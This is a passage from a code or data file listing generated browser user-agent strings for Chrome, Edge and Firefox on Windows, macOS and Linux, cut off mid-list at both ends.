    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/51 Safari/537 Edg/51",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/50 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:86) Gecko/20100101 Firefox/86",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/85 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/85 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/49 Safari/537 Edg/49",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/48 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:85) Gecko/20100101 Firefox/85",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/84 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/84 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/47 Safari/537 Edg/47",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/46 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:84) Gecko/20100101 Firefox/84",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/83 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/83 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/45 Safari/537 Edg/45",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/44 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:83) Gecko/20100101 Firefox/83",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/82 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/82 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/43 Safari/537 Edg/43",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/42 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:82) Gecko/20100101 Firefox/82",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/81 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/81 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/41 Safari/537 Edg/41",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/40 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:81) Gecko/20100101 Firefox/81",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/80 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/80 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/39 Safari/537 Edg/39",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/38 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:80) Gecko/20100101 Firefox/80",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/79 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/79 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/37 Safari/537 Edg/37",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/36 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:79) Gecko/20100101 Firefox/79",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/78 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/78 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/35 Safari/537 Edg/35",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/34 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:78) Gecko/20100101 Firefox/78",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/77 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/77 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/33 Safari/537 Edg/33",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/32 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:77) Gecko/20100101 Firefox/77",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/76 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/76 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/31 Safari/537 Edg/31",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/30 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:76) Gecko/20100101 Firefox/76",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/75 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/75 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/29 Safari/537 Edg/29",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/28 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:75) Gecko/20100101 Firefox/75",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/74 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/74 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/27 Safari/537 Edg/27",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/26 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:74) Gecko/20100101 Firefox/74",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/73 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/73 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/25 Safari/537 Edg/25",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/24 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:73) Gecko/20100101 Firefox/73",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/72 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/72 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/23 Safari/537 Edg/23",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/22 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:72) Gecko/20100101 Firefox/72",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/71 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/71 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/21 Safari/537 Edg/21",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/20 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:71) Gecko/20100101 Firefox/71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/70 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/70 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/19 Safari/537 Edg/19",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/18 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:70) Gecko/20100101 Firefox/70",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/69 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/69 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/17 Safari/537 Edg/17",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/16 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:69) Gecko/20100101 Firefox/69",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/68 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/68 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/15 Safari/537 Edg/15",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/14 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:68) Gecko/20100101 Firefox/68",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/67 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/67 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/13 Safari/537 Edg/13",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/12 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:67) Gecko/20100101 Firefox/67",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/66 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/66 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/11 Safari/537 Edg/11",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/10 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:66) Gecko/20100101 Firefox/66",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/65 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/65 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/9 Safari/537 Edg/9",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/8 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:65) Gecko/20100101 Firefox/65",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/64 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/64 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/7 Safari/537 Edg/7",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/6 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:64) Gecko/20100101 Firefox/64",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/63 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/63 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/5 Safari/537 Edg/5",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/4 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:63) Gecko/20100101 Firefox/63",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/62 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/62 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/3 Safari/537 Edg/3",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/2 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:62) Gecko/20100101 Firefox/62",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/61 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/61 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/1 Safari/537 Edg/1",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:61) Gecko/20100101 Firefox/61",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/60 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/60 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:60) Gecko/20100101 Firefox/60",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/59 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/59 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:59) Gecko/20100101 Firefox/59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/58 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/58 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:58) Gecko/20100101 Firefox/58",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/57 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/57 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:57) Gecko/20100101 Firefox/57",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/56 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/56 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:56) Gecko/20100101 Firefox/56",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/55 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/55 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:55) Gecko/20100101 Firefox/55",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/54 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/54 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:54) Gecko/20100101 Firefox/54",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/53 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/53 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:53) Gecko/20100101 Firefox/53",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/52 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/52 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:52) Gecko/20100101 Firefox/52",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/51 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/51 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:51) Gecko/20100101 Firefox/51",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/50 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/50 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:50) Gecko/20100101 Firefox/50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/49 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/49 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:49) Gecko/20100101 Firefox/49",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/48 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/48 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:48) Gecko/20100101 Firefox/48",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/47 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/47 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:47) Gecko/20100101 Firefox/47",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/46 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/46 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:46) Gecko/20100101 Firefox/46",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/45 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/45 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:45) Gecko/20100101 Firefox/45",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/44 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/44 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:44) Gecko/20100101 Firefox/44",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/43 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/43 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:43) Gecko/20100101 Firefox/43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/42 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/42 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:42) Gecko/20100101 Firefox/42",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/41 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/41 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:41) Gecko/20100101 Firefox/41",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/40 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/40 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:40) Gecko/20100101 Firefox/40",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/39 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/39 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:39) Gecko/20100101 Firefox/39",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/38 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/38 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:38) Gecko/20100101 Firefox/38",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/37 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/37 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:37) Gecko/20100101 Firefox/37",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/36 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/36 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:36) Gecko/20100101 Firefox/36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/35 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/35 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:35) Gecko/20100101 Firefox/35",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/34 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/34 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:34) Gecko/20100101 Firefox/34",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/33 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/33 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:33) Gecko/20100101 Firefox/33",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/32 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/32 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:32) Gecko/20100101 Firefox/32",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/31 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/31 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:31) Gecko/20100101 Firefox/31",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/30 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/30 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:30) Gecko/20100101 Firefox/30",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/29 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/29 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:29) Gecko/20100101 Firefox/29",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/28 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/28 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:28) Gecko/20100101 Firefox/28",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/27 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/27 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:27) Gecko/20100101 Firefox/27",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/26 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/26 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:26) Gecko/20100101 Firefox/26",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/25 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/25 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:25) Gecko/20100101 Firefox/25",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/24 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/24 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:24) Gecko/20100101 Firefox/24",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/23 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/23 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:23) Gecko/20100101 Firefox/23",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/22 Safari/537",
